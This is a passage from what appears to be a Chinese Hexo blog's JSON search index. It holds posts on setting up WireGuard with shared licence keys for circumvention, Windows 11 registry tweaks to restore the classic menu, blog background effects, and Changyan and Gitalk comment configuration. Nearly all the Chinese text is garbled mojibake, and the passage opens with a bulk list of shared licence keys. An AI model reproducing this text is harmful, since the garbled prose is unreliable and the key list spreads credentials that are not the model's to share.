GB)\nğŸ” Key: hV25y10g-0Hi678gc-9b06HL5F (24598562 GB)\nğŸ” Key: 4BLI280U-B5c9d17X-57b89Njn (24598562 GB)\nğŸ” Key: 0e3d75yj-ga82N70x-YG3a5C06 (24598562 GB)\nğŸ” Key: N2C143ct-uea678k1-8mUot240 (24598562 GB)\nğŸ” Key: 6y4g9f7j-H198qdA6-9F2G8vw0 (24598562 GB)\nğŸ” Key: EGR3r108-eU0m381t-8Ec26i9t (24598562 GB)\nğŸ” Key: zg2B0W41-S16ye8m5-kEQ64R05 (24598562 GB)\nğŸ” Key: vgs159Q0-6OQe9v07-aj2385TU (24598562 GB)\nğŸ” Key: 6dU2q39L-207jq8nP-3V4L6Sl2 (24598562 GB)\nğŸ” Key: 19Gk4bL0-9V8XPS64-g72TEu90 (24598562 GB)\nğŸ” Key: C2045eQc-n0841qKY-4vV3jY08 (24598562 GB)\nğŸ” Key: p58J1O4H-P14tT65z-8Rr36mv4 (24598562 GB)\nğŸ” Key: 24n6m9eh-9T0jH35K-5k71A9mf (24598562 GB)\nğŸ” Key: 8dIB52E1-3s19ar7z-apS65f73 (24598562 GB)\nğŸ” Key: z4jG2I08-ha5Y2c17-5U8qi39F (24598562 GB)\nğŸ” Key: 2mp506db-L57S9Mu2-ey2WI461 (24598562 GB)\nğŸ” Key: 13R58eyJ-d79iD3I0-7Z64mz9L (24598562 GB)\nğŸ” Key: 154vY2qO-Kb51S83l-2J04FdQ7 (24598562 GB)\nğŸ” Key: 132oL6bq-K4S3oz05-h5324nxf (24598562 GB)\nğŸ” Key: f107WP6Q-g1e3wF74-18Q7lt5S (24598562 GB)\n```\n\n### ä¸‹è½½ä»£ç†å·¥å…·\n\nè¿™æ¬¡éœ€è¦çš„ä»£ç†å·¥å…·æ˜¯wireguardï¼Œ[å®˜æ–¹ä¸‹è½½é“¾æ¥](https://www.wireguard.com/install/)\n\n[å¤‡ç”¨ä¸‹è½½åœ°å€](https://pan.baidu.com/s/1Dlg26xlYBnfWNVXx0PWTdA?pwd=trha)\næå–ç ï¼štrha\n\nä¸‹è½½å®Œç›´æ¥å®‰è£…å°±OKã€‚\n\nè¿™æ˜¯è½¯ä»¶çš„æˆªå›¾ã€‚\n\n![wireguardè½¯ä»¶æˆªå›¾](./science-network/2.png)\n\næ–°ç”¨æˆ·æ²¡æœ‰é…ç½®æ˜¯ä¸ä¼šæœ‰é…ç½®ä¿¡æ¯çš„\n\n* é¦–å…ˆå·¦ä¸‹è§’æ‰¾åˆ°è¿™ä¸ªä¸‹æ‹‰æ¡†ï¼Œç‚¹å‡»æ–°å»ºç©ºéš§é“\n\n* ä¼šè®©ä½ èµ·ä¸€ä¸ªåå­—ï¼Œéšä¾¿èµ·ä¸€ä¸ªåå­—å°±å¥½\n\n* å…¬é’¥çš„éƒ¨åˆ†ä¸è¦åŠ¨\n\n* å†å¾€ä¸‹çš„æ–‡æœ¬å—æ˜¯é…ç½®ä¿¡æ¯ï¼Œç„¶åæŠŠç”»é¢åœåœ¨è¿™é‡Œï¼Œæœ€å°åŒ–ï¼Œæˆ‘ä»¬å»ç”Ÿæˆé…ç½®ä¿¡æ¯\n\n### ç”Ÿæˆé…ç½®ä¿¡æ¯\n\nåˆ©ç”¨ä¸€ä¸ªåœ¨çº¿çš„å·¥å…·ç”Ÿæˆé…ç½®ä¿¡æ¯ï¼Œ[å·¥å…·é“¾æ¥åœ°å€](https://replit.com/@misaka-blog/wgcf-profile-generator?v=1)\n\n![ç½‘ç«™æˆªå›¾](./science-network/3.png)\n\nè¿›å…¥ç½‘ç«™åï¼Œç‚¹å‡»å³ä¸Šè§’çš„Runï¼Œç¨ç­‰ç‰‡åˆ»\n\n![å¼€å§‹é…ç½®](./science-network/4.png)\n\nå‡ºç°è¿™ä¸ªç”»é¢åï¼Œå› ä¸ºæˆ‘ä»¬ä½¿ç”¨çš„æ˜¯ç§˜é’¥ï¼Œå¯¹åº”çš„é€‰é¡¹æ˜¯2ï¼Œè¾“å…¥2åå›è½¦ã€‚\n\n![å¼€å§‹é…ç½®](./science-network/5.png)\n\nè¿™é‡Œè®©è¾“å…¥ç§˜é’¥ï¼Œå°±æ˜¯ä¹‹å‰åœ¨telegramè·å–çš„ç§˜é’¥ï¼Œç²˜è´´åœ¨è¿™é‡Œåå›è½¦ã€‚\n\nä¹‹åä¼šè¦æ±‚è¾“å…¥ä¸€ä¸ªéšæœºè®¾å¤‡åï¼Œéšä¾¿è¾“å…¥ä¸€ä¸ªå­—ç¬¦ä¸²å›è½¦å°±å¥½ã€‚\n\n![å¼€å§‹é…ç½®](./science-network/6.png)\n\nç”Ÿæˆçš„çº¢è‰²éƒ¨åˆ†å°±æ˜¯é…ç½®ä¿¡æ¯ï¼ŒæŠŠé…ç½®ä¿¡æ¯å¤åˆ¶ä¸‹æ¥ï¼Œç„¶åç²˜è´´åœ¨wireguardçš„æ–‡æœ¬å—é‡Œï¼Œå°±åƒè¿™æ ·ã€‚\n\n![å¼€å§‹é…ç½®](./science-network/7.png)\n\næœ€åä¿å­˜é…ç½®ä¿¡æ¯ã€‚\n\nå¤§å¤šæ•°æƒ…å†µä¸‹æ˜¯æ²¡æœ‰åŠæ³•ç›´æ¥ä½¿ç”¨çš„ï¼Œå› ä¸ºç°åœ¨æ‹¿åˆ°çš„IPå¹¶ä¸æ˜¯æœ€ä¼˜IPï¼Œæ‰€ä»¥éœ€è¦å¦ä¸€ä¸ªå·¥å…·æ¥å¸®åŠ©ç­›é€‰æœ€ä¼˜çš„IPï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¦‚æœç›®å‰æœ‰åœ¨ä½¿ç”¨ä»»ä½•çš„ä»£ç†æˆ–è€…science onlineå·¥å…·å¿…é¡»è¦åœä¸‹æ¥ï¼Œä¸ç„¶ä¼šæåº¦å½±å“æœ€ä¼˜IPçš„ç­›é€‰ã€‚\n\n### ç­›é€‰æœ€ä¼˜IP\n\n[å·¥å…·ä¸‹è½½é“¾æ¥](https://gitlab.com/Misaka-blog/warp-script/-/blob/main/files/warp-yxip/warp-yxip-win.7z)\n\n[å¤‡ç”¨ä¸‹è½½é“¾æ¥](https://pan.baidu.com/s/1UZZsxrOWu-PglAx9IYFBKA?pwd=je5f)\næå–ç ï¼šje5f\n\nè¿™ä¸ªå·¥å…·æ˜¯å®Œå…¨å…è´¹å¼€æºçš„ï¼Œå¯ä»¥æ”¾å¿ƒä½¿ç”¨ã€‚\n\nä¸‹è½½å®Œè§£å‹ï¼Œæœ‰ä¸€ä¸ª`warp-yxip.bat`çš„æ–‡ä»¶ï¼ŒåŒå‡»è¿è¡Œ\n\n![è¿è¡Œæ•ˆæœ](./science-network/8.png)\n\né€‰æ‹©IPV4çš„ç­›é€‰ï¼Œè¾“å…¥1ï¼Œå›è½¦ï¼Œç­‰å¾…ç‰‡åˆ»ï¼Œè¿›ç¨‹è¿è¡Œå®Œæ¯•åï¼Œä¼šåœ¨å·¥å…·çš„ç›®å½•ä¸‹ç”Ÿæˆä¸€ä¸ªresultçš„æ–‡ä»¶ä½¿ç”¨Excelæ‰“å¼€ã€‚\n\n![æ•ˆæœå¦‚å›¾](./science-network/9.png)\n\n* LOSS æ˜¯ä¸¢åŒ…ç‡\n\n* DELAY æ˜¯å»¶è¿Ÿ\n\né»˜è®¤ä¼šæŠŠç»“æœæŒ‰ä»ä¼˜åˆ°å·®è¿›è¡Œæ’åºï¼Œåªéœ€è¦ä»å‰é¢å‡ ä¸ªæŠ½ä¸€ä¸ªï¼Œå¤åˆ¶å¥½IPå’Œç«¯å£å·ç„¶åæ›¿æ¢æ‰wireguardé…ç½®æ–‡ä»¶é‡Œçš„æœ€åä¸€é¡¹ï¼Œæ¯”å¦‚`Endpoint = 162.159.192.160:894`ã€‚\n\nè¡¥å……ä¸€ç‚¹ï¼Œåœ¨wireguardé‡Œï¼Œå¦‚æœéœ€è¦å†å¯¹é…ç½®æ–‡ä»¶è¿›è¡Œæ›´æ”¹ï¼Œå¯ä»¥ç›´æ¥å³å‡»é…ç½®åç§°ï¼Œé€‰æ‹©â€œç¼–è¾‘æ‰€é€‰éš§é“â€ã€‚\n\né…ç½®åˆ°è¿™é‡Œï¼Œå°±å®Œæˆäº†ï¼Œå¯ä»¥è¿›è¡Œè¿æ¥ï¼Œå¼€å§‹science onlineæ—…ç¨‹äº†ã€‚","tags":["science online"],"categories":["å°ç©æ„å„¿"]},{"title":"Win11åˆ‡æ¢Win10ç»å…¸å³å‡»èœå•æ ","url":"/2023/07/21/classic-menu/","content":"\nç›¸ä¿¡æœ‰ä¸å°‘å‡çº§ä¸ºWin11çš„å°ä¼™ä¼´å¯¹Win11çš„æŠ˜å å³å‡»èœå•éå¸¸ä¸èˆ’æœï¼Œå¹³å¸¸åªéœ€è¦ä¸€æ¬¡å³å‡»çš„äº‹æƒ…ï¼Œç°åœ¨è¿˜è¦å±•å¼€æ›´å¤šï¼Œå†å»æ‰¾éœ€è¦çš„å·¥å…·ã€‚éå¸¸å½±å“ä½¿ç”¨ä½“éªŒï¼Œæ¥ä¸‹æ¥ï¼Œå‘Šè¯‰å¤§å®¶ä¸ç”¨ä¸‹è½½ä»»ä½•ç¬¬ä¸‰æ–¹è½¯ä»¶ï¼Œä¹Ÿä¸ç”¨æ‰‹åŠ¨ä¿®æ”¹æ³¨å†Œè¡¨ï¼Œåªéœ€è¦æ‰§è¡Œä¸¤æ¡å‘½ä»¤å°±ä¼šè‡ªåŠ¨ä¿®æ”¹æ³¨å†Œè¡¨çš„æ–¹æ³•ã€‚\n\n### åˆ‡æ¢Win10ç»å…¸å³å‡»èœå•æ \n\n<kbd>Win</kbd>+<kbd>R</kbd>ï¼Œè¾“å…¥`cmd`å›è½¦ï¼Œç´§æ¥ç€å¤åˆ¶å¹¶æ‰§è¡Œä¸‹é¢ä¸¤æ¡å‘½ä»¤ã€‚\n\n<!-- more -->\n\n```bash\nreg add \"HKCU\\Software\\Classes\\CLSID\\{86ca1aa0-34aa-4e8b-a509-50c905bae2a2}\\InprocServer32\" /f /ve\n```\n\n```bash\ntaskkill /f /im explorer.exe & start explorer.exe\n```\n\n### æ¢å¤Win11å³å‡»èœå•æ \n\næ—¢ç„¶å¯ä»¥åˆ‡æ¢åˆ°Win10çš„èœå•æ ï¼Œé‚£è‡ªç„¶ä¹Ÿå¯ä»¥æ¢å¤ä¸ºWin11çš„èœå•æ ã€‚åŒæ ·çš„ï¼Œ<kbd>Win</kbd>+<kbd>R</kbd>ï¼Œè¾“å…¥`cmd`å›è½¦ï¼Œç´§æ¥ç€å¤åˆ¶å¹¶æ‰§è¡Œä¸‹é¢ä¸¤æ¡å‘½ä»¤ã€‚\n\n```bash\nreg delete \"HKCU\\Software\\Classes\\CLSID\\{86ca1aa0-34aa-4e8b-a509-50c905bae2a2}\" /f\n```\n\n```bash\ntaskkill /f /im explorer.exe & start explorer.exe\n```","tags":["Windows"],"categories":["å°ç©æ„å„¿"]},{"title":"è®¾ç½®åšå®¢èƒŒæ™¯åŠ¨æ€ç‰¹æ•ˆ","url":"/2023/07/17/FlyLine/","content":"\n### ä¿®æ”¹é…ç½®æ–‡ä»¶\n\né™æ€çš„åšå®¢å®åœ¨æ˜¯å¤ªå•è°ƒäº†ï¼Œå¢åŠ ä¸€ç‚¹åŠ¨æ€çš„æ•ˆæœå§ã€‚\n\n1. åŒæ·»åŠ èƒŒæ™¯å›¾ç‰‡ä¸€æ ·ï¼ŒåŒæ ·éœ€è¦æ‰“å¼€ä¸€ä¸ªå¼€å…³ï¼Œä¹Ÿå°±æ˜¯å–æ¶ˆfooterè¿™ä¸ªæ³¨é‡Šã€‚\n\n<!-- more -->\n\n```yml\ncustom_file_path:\n  #head: source/_data/head.njk\n  #header: source/_data/header.njk\n  #sidebar: source/_data/sidebar.njk\n  #postMeta: source/_data/post-meta.njk\n  #postBodyEnd: source/_data/post-body-end.njk\n  footer: source/_data/footer.swig\n  #bodyEnd: source/_data/body-end.njk\n  #variable: source/_data/variables.styl\n  #mixin: source/_data/mixins.styl\n  style: source/_data/styles.styl\n  ```\n\n2. å–æ¶ˆæ³¨é‡Šä»¥åï¼Œåˆ›å»ºè¿™æ ·çš„ä¸€ä¸ªæ–‡ä»¶source/_data/footer.swigï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™ä¸ªsourceæ˜¯ç«™ç‚¹ç›®å½•ä¸‹çš„sourceï¼Œè€Œä¸æ˜¯ä¸»é¢˜ç›®å½•ä¸‹çš„sourceã€‚\n\nåˆ›å»ºå¥½ä¹‹åï¼Œåœ¨æ–‡ä»¶æ’å…¥ä»¥ä¸‹ä»£ç ï¼š\n\n```js\n<script color=\"107,194,53\" opacity=\"1.0\" zIndex=\"-1\" count=\"99\" src=\"https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js\"></script>\n```\n\n* colorè®¾ç½®çš„æ˜¯çº¿æ¡çš„RGBå€¼ã€‚\n* opacityè®¾ç½®çš„æ˜¯ç±»ä¼¼é€æ˜åº¦çš„æ•°å€¼ã€‚\n* countè®¾ç½®çš„æ˜¯çº¿æ¡çš„æ•°é‡ã€‚\n\né‡æ–°ç”Ÿæˆä¸€ä¸‹é…ç½®ï¼Œå°±ä¼šå‡ºç°æ•ˆæœäº†ã€‚","tags":["åšå®¢ç¾åŒ–"],"categories":["åšå®¢æ­å»º"]},{"title":"è®¾ç½®åšå®¢èƒŒæ™¯å›¾ç‰‡","url":"/2023/07/17/BGPic/","content":"\n### ä¿®æ”¹NEXTçš„é…ç½®æ–‡ä»¶\n\næˆ‘ä¸€ç›´ä½¿ç”¨çš„æ˜¯Nextçš„ä¸»é¢˜ï¼Œè¿™ä¸ªä¸»é¢˜é»˜è®¤æ˜¯å¯ä»¥è‡ªå®šä¹‰ä¸€äº›æ ·å¼çš„ã€‚\n\n1. é¦–å…ˆé€‰æ‹©ä¸€å¼ å¿ƒä»ªçš„èƒŒæ™¯å›¾ç‰‡ï¼Œæ·»åŠ åˆ°themes/next/source/images/xx.jpgã€‚æˆ‘å»ºè®®å›¾ç‰‡çš„å¤§å°æœ€å¥½æ§åˆ¶ä¸€ä¸‹ï¼Œæœ€å¥½æ§åˆ¶åœ¨400k-500Kå·¦å³ï¼ŒåŠ¨è¾„å‡ å…†å¤§å°çš„èƒŒæ™¯å›¾ç‰‡ç½‘é¡µåŠ è½½èµ·æ¥ä¼šå¾ˆåƒåŠ›ï¼Œéå¸¸å½±å“å®é™…ä½“éªŒã€‚\n\n2. ç„¶åéœ€è¦æ‰“å¼€è¿™ä¸ªå¼€å…³ï¼Œä¹Ÿå°±æ˜¯å–æ¶ˆstyleè¿™ä¸ªæ³¨é‡Š\n\n<!-- more -->\n\n```yml\ncustom_file_path:\n  #head: source/_data/head.njk\n  #header: source/_data/header.njk\n  #sidebar: source/_data/sidebar.njk\n  #postMeta: source/_data/post-meta.njk\n  #postBodyEnd: source/_data/post-body-end.njk\n  #footer: source/_data/footer.swig\n  #bodyEnd: source/_data/body-end.njk\n  #variable: source/_data/variables.styl\n  #mixin: source/_data/mixins.styl\n  style: source/_data/styles.styl\n  ```\n\n3. å–æ¶ˆæ³¨é‡Šä»¥åï¼Œåˆ›å»ºè¿™æ ·çš„ä¸€ä¸ªæ–‡ä»¶source/_data/styles.stylï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™ä¸ªsourceæ˜¯ç«™ç‚¹ç›®å½•ä¸‹çš„sourceï¼Œè€Œä¸æ˜¯ä¸»é¢˜ç›®å½•ä¸‹çš„sourceã€‚\n\nåˆ›å»ºå¥½ä¹‹åï¼Œåœ¨æ–‡ä»¶æ’å…¥ä»¥ä¸‹ä»£ç ï¼š\n\n```yml\nbody {\n \tbackground:url(/images/xx.jpg);\n \tbackground-repeat: no-repeat;\n    background-attachment:fixed;\n    background-position:100% 100%;\n}\n```\n\n* background:url ä¸ºå›¾ç‰‡è·¯å¾„ï¼Œä¹Ÿå¯ä»¥ç›´æ¥ä½¿ç”¨é“¾æ¥ã€‚\n* background-repeatï¼šè‹¥æœèƒŒæ™¯å›¾ç‰‡ä¸èƒ½å…¨å±ï¼Œé‚£ä¹ˆæ˜¯å¦å¹³é“ºæ˜¾ç¤ºï¼Œå……æ»¡å±å¹•\n* background-attachmentï¼šèƒŒæ™¯æ˜¯å¦éšç€ç½‘é¡µä¸Šä¸‹æ»šåŠ¨è€Œæ»šåŠ¨ï¼Œfixed ä¸ºå›ºå®š\n* background-sizeï¼šå›¾ç‰‡å±•ç¤ºå¤§å°ï¼Œè¿™é‡Œè®¾ç½® 100%ï¼Œ100% çš„æ„ä¹‰ä¸ºï¼šå¦‚æœèƒŒæ™¯å›¾ç‰‡ä¸èƒ½å…¨å±ï¼Œé‚£ä¹ˆæ˜¯å¦é€šè¿‡æ‹‰ä¼¸çš„æ–¹å¼å°†èƒŒæ™¯å¼ºåˆ¶æ‹‰ä¼¸è‡³å…¨å±æ˜¾ç¤ºã€‚\n\né‡æ–°ç”Ÿæˆä¸€ä¸‹é…ç½®ï¼Œå°±ä¼šå‡ºç°æ•ˆæœäº†ã€‚","tags":["åšå®¢ç¾åŒ–"],"categories":["åšå®¢æ­å»º"]},{"title":"åšå®¢è¯„è®ºç³»ç»Ÿä¹‹changyan","url":"/2023/07/17/changyan-comment/","content":"\n### æ­å»ºåŸå› \n\nä¹‹å‰åœ¨åšå®¢æ­å»ºäº†è¯„è®ºçš„æ¿å—ï¼Œä½†æ˜¯å› ä¸ºä½¿ç”¨çš„æ˜¯gitalkçš„è¯„è®ºåŠŸèƒ½ï¼Œå¦‚æœè®¿å®¢è¦è¿›è¡Œè¯„è®ºçš„è¯ï¼Œé¦–å…ˆå¿…é¡»æ‹¥æœ‰ä¸€ä¸ªgithubçš„è´¦å·ï¼Œä½†ç»å¤§å¤šæ•°äººå¦‚æœä¸åšè¿™ä¸€è¡Œï¼Œä¸å‘å¼€å‘é æ‹¢ï¼Œå°±å¾ˆå¤§ç¨‹åº¦ä¸Šæ²¡æœ‰githubçš„è´¦å·ã€‚åŸºäºè¿™æ ·çš„åŸå› ï¼Œæˆ‘åˆé‡æ–°å¯»æ‰¾è¯„è®ºçš„æ’ä»¶ï¼Œç»ˆäºæ‰¾åˆ°äº†é€‚åˆå›½äººçš„è¯„è®ºæ’ä»¶â€œç•…è¨€â€ã€‚ç•…è¨€æ˜¯æ”¯æŒæ‰‹æœºå·ã€QQè´¦å·ã€å¾®ä¿¡è´¦å·ç™»å½•ä½¿ç”¨çš„ï¼Œå¾ˆç¬¦åˆæˆ‘çš„éœ€æ±‚ï¼Œäºæ˜¯ç®€å•äº†è§£äº†ä¸€ä¸‹æ­å»ºçš„æ–¹æ³•ï¼Œåœ¨è¿™é‡Œåˆ†äº«ç»™å¤§å®¶ã€‚\n\n### æ¡ä»¶å‡†å¤‡\n\n1. ä½¿ç”¨ç•…è¨€è¯„è®ºï¼Œæˆ‘ä»¬é¦–å…ˆè¦å»[ç•…è¨€è¯„è®ºå®˜ç½‘](https://changyan.kuaizhan.com/)æ³¨å†Œä¸€ä¸ªè´¦å·ã€‚\n\n<!-- more -->\n\nç´§æ¥ç€æˆ‘ä»¬éœ€è¦æ·»åŠ ä¸€ä¸ªç«™ç‚¹ï¼ŒæŒ‰ç…§è¦æ±‚æ¥å°±OKã€‚ç«™ç‚¹åç§°éšä¾¿è¾“å…¥ï¼Œç½‘å€æ˜¯ä½ çš„ç½‘ç«™çš„åŸŸåï¼Œç™½åå•é€‰å¡«ï¼Œç›´æ¥è·³è¿‡å°±OKï¼Œç«™ç‚¹ç±»å‹æŒ‰ç…§ä¸‹æ‹‰æ¡†é€‰æ‹©å°±å¥½ï¼Œç½‘ç«™logoæœ‰å°±æ·»åŠ ï¼Œæ²¡æœ‰å¯ä»¥ä¸æ·»åŠ ã€‚æ€»çš„æ¥è®²ï¼Œåªæœ‰ç«™ç‚¹ç½‘ç«™è¿™ä¸€ä¸ªæ¡†æ¯”è¾ƒé‡è¦ã€‚\n\n![æ·»åŠ ç«™ç‚¹](./changyan-comment/1.png)\n\n2. æ‰¾åˆ°IDå’ŒSECRETã€‚\n\næ³¨å†Œå¥½ä¹‹åï¼Œåœ¨åå°æ€»è§ˆå¯ä»¥æ‰¾åˆ°è¿™ä¸¤ä¸ªå‚æ•°ï¼Œè¿™ä¸¤ä¸ªå‚æ•°å¾…ä¼šè¿˜æœ‰åˆ«çš„ç”¨å¤„ã€‚\n\n![æ·»åŠ ç«™ç‚¹](./changyan-comment/2.png)\n\n3. ä¿®æ”¹NEXTçš„ä¸»é¢˜é…ç½®æ–‡ä»¶ã€‚\n\nå°†commentçš„activeå€¼ä¿®æ”¹ä¸ºchangyanã€‚\n\n```yml\ncomments:\n  # Available values: tabs | buttons\n  style: tabs\n  # Choose a comment system to be displayed by default.\n  # Available values: disqus | disqusjs | changyan | livere | gitalk | utterances\n  active: changyan\n```\n\nç„¶åè¿›è¡Œchangyançš„ä¸»é…ç½®ä¿®æ”¹ï¼Œå°†enableå€¼æ”¹ä¸ºtrueï¼Œä¸‹é¢çš„appidå’Œappkeyå¯¹åº”ç•…è¨€å®˜ç½‘çš„APP IDå’ŒAPP SECRETã€‚\n\n```yml\nchangyan:\n  enable: true # false\n  appid: c*******s\n  appkey: 48a****b8**2328cd*****ab****50d7\n  # Show comments count\n  count: true\n```\n\nä¿®æ”¹å®Œæˆåï¼Œå¯ä»¥åœ¨åšå®¢ä¸Šçœ‹åˆ°ç•…è¨€è¯„è®ºçš„è¯„è®ºåŒºäº†ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š\n\n![æ·»åŠ ç«™ç‚¹](./changyan-comment/3.png)\n\n4. å¯¹è¯„è®ºåŒºçš„åŠŸèƒ½è¿›è¡Œæ›´å¤šçš„è®¾ç½®ã€‚\n\nå¯ä»¥åœ¨ä¸»é¡µç³»ç»Ÿè®¾ç½®çš„é€šç”¨è®¾ç½®é‡Œè®¾ç½®å®¡æ ¸è§„åˆ™ï¼Œæ˜¯å¦å…è®¸ç”¨å›¾ç‰‡è¿›è¡Œè¯„è®ºï¼Œå®˜æ–¹å›å¤ä½¿ç”¨çš„æ˜µç§°å’Œå¤´åƒã€‚\n\n![æ·»åŠ ç«™ç‚¹](./changyan-comment/4.png)\n\nå¯ä»¥åœ¨ä¸»é¡µç³»ç»Ÿè®¾ç½®çš„PCç‰ˆè®¾ç½®é‡Œçš„æ˜¾ç¤ºé…ç½®ï¼Œè¿›è¡Œè¯„è®ºåŒºçš„æ˜¾ç¤ºé…ç½®ã€‚\n\n![æ·»åŠ ç«™ç‚¹](./changyan-comment/5.png)\n\nè¿˜å¯ä»¥è®¾ç½®ä¸»é¢˜çš„æ ·å¼ã€‚\n\n![æ·»åŠ ç«™ç‚¹](./changyan-comment/6.png)","tags":["åšå®¢è¯„è®º"],"categories":["åšå®¢æ­å»º"]},{"title":"åšå®¢è¯„è®ºç³»ç»Ÿä¹‹gitalk","url":"/2023/07/14/gitalk-comment/","content":"\n### èƒŒæ™¯ä»‹ç»\n\nè‡ªå·±ä¸€å‘³çš„è¾“å‡ºï¼Œå€˜è‹¥æ”¶ä¸åˆ°åˆ«äººçš„åé¦ˆï¼Œè‡ªå·±ä¹Ÿæ˜¯ä¸ä¼šè¿›æ­¥çš„ï¼Œåšå®¢çš„è´¨é‡ä¹Ÿå°±åªä¼šåœ¨å½“å‰çš„æ°´å¹³åœæ­¢ä¸å‰ï¼Œåœ¨è¿™æ ·çš„å½±å“ä¸‹ï¼Œæˆ‘å†³å¿ƒè¦ç»™åšå®¢æ‰“é€ ä¸€ä¸ªè¯„è®ºç³»ç»Ÿï¼Œäºæ˜¯æˆ‘èŠ±äº†ç‚¹æ—¶é—´æ·±å…¥ç ”ç©¶äº†åšå®¢çš„è¯„è®ºçš„ç³»ç»Ÿæ­å»ºã€‚\n\næœ€åˆï¼Œæˆ‘é€‰æ‹©çš„æ˜¯githubçš„gitalkã€‚\n\n### ç¯å¢ƒè¯´æ˜\n\næˆ‘çš„åšå®¢åŸºäºhexoï¼Œä½¿ç”¨çš„æ˜¯nextä¸»é¢˜ï¼Œè¿™ä¸ªä¸»é¢˜å®‰è£…ä¹‹åï¼Œåœ¨ä¸»é¢˜çš„é…ç½®æ–‡ä»¶ä¸­ï¼Œé»˜è®¤å­˜åœ¨å‡ ä¸ªå…³äºè¯„è®ºçš„ç³»ç»Ÿæ¿å—ï¼Œæˆ‘ä»¬åªè¦é’ˆå¯¹gitalkè¿™ä¸ªæ¿å—ç¼–è¾‘å°±OKã€‚\n\n<!-- more -->\n\n### åˆ›å»ºä»“åº“\n\n1. ç›´æ¥åœ¨githubé¦–é¡µåˆ›å»ºä¸€ä¸ªä»“åº“ï¼Œç”¨æ¥å­˜å‚¨åšå®¢çš„è¯„è®ºï¼Œç›¸å½“äºä¸€ä¸ªæ•°æ®åº“çš„ä½œç”¨ã€‚\n\n* é¦–å…ˆå¡«å†™ä¸€ä¸ªä»“åº“åå­—ï¼Œä¸‹é¢æŠ¥çº¢æ˜¯å› ä¸ºæˆ‘å·²ç»åˆ›å»ºè¿‡ä¸€ä¸ªäº†ã€‚\n* ä»“åº“æè¿°çš„è¯é€‰å¡«ï¼Œå¯å†™å¯ä¸å†™ã€‚\n* é€‰æ‹©ä¸ºpublicã€‚\n* æœ€åç‚¹å‡»åˆ›å»ºä»“åº“ã€‚\n\n![åˆ›å»ºä»“åº“](./gitalk-comment/1.png)\n\n2. é™¤äº†å»ºä»“åº“ï¼Œè¿˜éœ€è¦æ³¨å†Œä¸€ä¸ªåº”ç”¨ã€‚[å®˜æ–¹æ³¨å†Œåœ°å€](https://github.com/settings/applications/new)ã€‚\n\n* Application nameå¡«å†™çš„è¿˜æ˜¯ä¸€ä¸ªåº”ç”¨ç¨‹åºçš„åå­—ï¼Œè¿™é‡Œæˆ‘å¡«å†™çš„å’Œä»“åº“çš„åå­—ä¿æŒä¸€æ ·äº†ï¼Œä½ ä»¬æŒ‰ç…§å–œå¥½æ¥å°±OKã€‚\n* Homepage URLç„¶åå¡«å†™çš„æ˜¯ä½ çš„ç½‘ç«™åŸŸåã€‚\n* Application descriptionæ¥ä¸‹æ¥åˆæ˜¯ä¸€ä¸ªæè¿°ç±»çš„ä¿¡æ¯ï¼Œé€‰å¡«ã€‚\n* Authorization callback URLè¿™é‡ŒåŒæ ·å¡«å†™ä½ ç½‘ç«™çš„åŸŸåã€‚\n* æœ€åæ³¨å†Œåº”ç”¨ç¨‹åºç­‰å¾…å®Œæˆå°±å¥½ã€‚\n\n![åˆ›å»ºåº”ç”¨ç¨‹åº](./gitalk-comment/2.png)\n\n3. åˆ›å»ºå®Œæˆåï¼Œé»˜è®¤ä¼šè¿›å…¥åº”ç”¨ç¨‹åºï¼Œæ¥ä¸‹æ¥è¦å®Œæˆä¸€ä¸ªç§˜é’¥çš„ç”Ÿæˆã€‚\n\n* Client IDé»˜è®¤ä¼šå­˜åœ¨ã€‚è¿™ä¸ªå¾…ä¼šè¿˜ä¼šç”¨åˆ°ã€‚\n* é»˜è®¤æ˜¯ä¸å­˜åœ¨å¯†é’¥çš„ï¼Œè¦ç‚¹å‡»ç”Ÿæˆç§˜é’¥ï¼Œç”Ÿæˆä¹‹åè¦ç«‹åˆ»å¤åˆ¶ä¸‹æ¥ï¼Œå› ä¸ºä¿å­˜æˆ–è€…ç¦»å¼€é¡µé¢å°±å˜æˆå›¾ä¾‹è¿™æ ·äº†ã€‚è¿™ä¸ªå¾…ä¼šè¿˜ä¼šç”¨åˆ°ã€‚\n* logoå¯ä»¥è‡ªå·±è®¾è®¡ä¸€ä¸ªï¼Œæ„Ÿè§‰è›®ä¸é”™çš„ã€‚\n* éƒ½è®¾ç½®å®Œä¹‹åç‚¹å‡»æœ€ä¸‹é¢çš„Update Applicationã€‚\n\n![è®¾ç½®åº”ç”¨ç¨‹åº](./gitalk-comment/3.png)\n\nåæœŸå¦‚æœéœ€è¦å¯¹åº”ç”¨ç¨‹åºè¿›è¡Œä¸€äº›ä¿®æ”¹ï¼Œå¯ä»¥ä¾æ¬¡åˆ°githubå¤´åƒ-->setting-->Developer Settings-->OAuth Appsè¿›è¡Œä¿®æ”¹ã€‚\n\n### ä¿®æ”¹é…ç½®æ–‡ä»¶\n\nä¿®æ”¹é…ç½®æ–‡ä»¶çš„éƒ¨åˆ†ï¼Œè¿›å…¥åšå®¢ä¸»ç›®å½•ï¼Œ`vim themes/next/_config.yml`\n\n1. é¦–å…ˆéœ€è¦æŠŠ`active`çš„å€¼ï¼Œæ”¹ä¸ºgitalk\n\n```yaml\ncomments:\n  # Available values: tabs | buttons\n  style: tabs\n  # Choose a comment system to be displayed by default.\n  # Available values: disqus | disqusjs | changyan | livere | gitalk | utterances\n  active: gitalk\n  # Setting `true` means remembering the comment system selected by the visitor.\n  storage: true\n  # Lazyload all comment systems.\n  lazyload: false\n  # Modify texts or order for any naves, here are some examples.\n  nav:\n    #disqus:\n    #  text: Load Disqus\n    #  order: -1\n    #gitalk:\n    #  order: -2\n```\n\n2. ç„¶åå¾€ä¸‹æ»‘ï¼Œæ‰¾åˆ°gitalkçš„æ¨¡å—ã€‚\n\n  * enableçš„å€¼è®¾ç½®ä¸ºtrueï¼Œè¡¨ç¤ºå¯ç”¨ã€‚\n  * github_idè¡¨ç¤ºä½ çš„githubçš„è´¦å·ã€‚\n  * repoï¼Œå¡«å†™ç”¨æ¥å­˜å‚¨è¯„è®ºçš„ä»“åº“ã€‚\n  * client_idä¹‹å‰åˆ›å»ºçš„IDã€‚\n  * client_secretä¹‹å‰åˆ›å»ºå¥½çš„å£ä»¤ã€‚\n  * 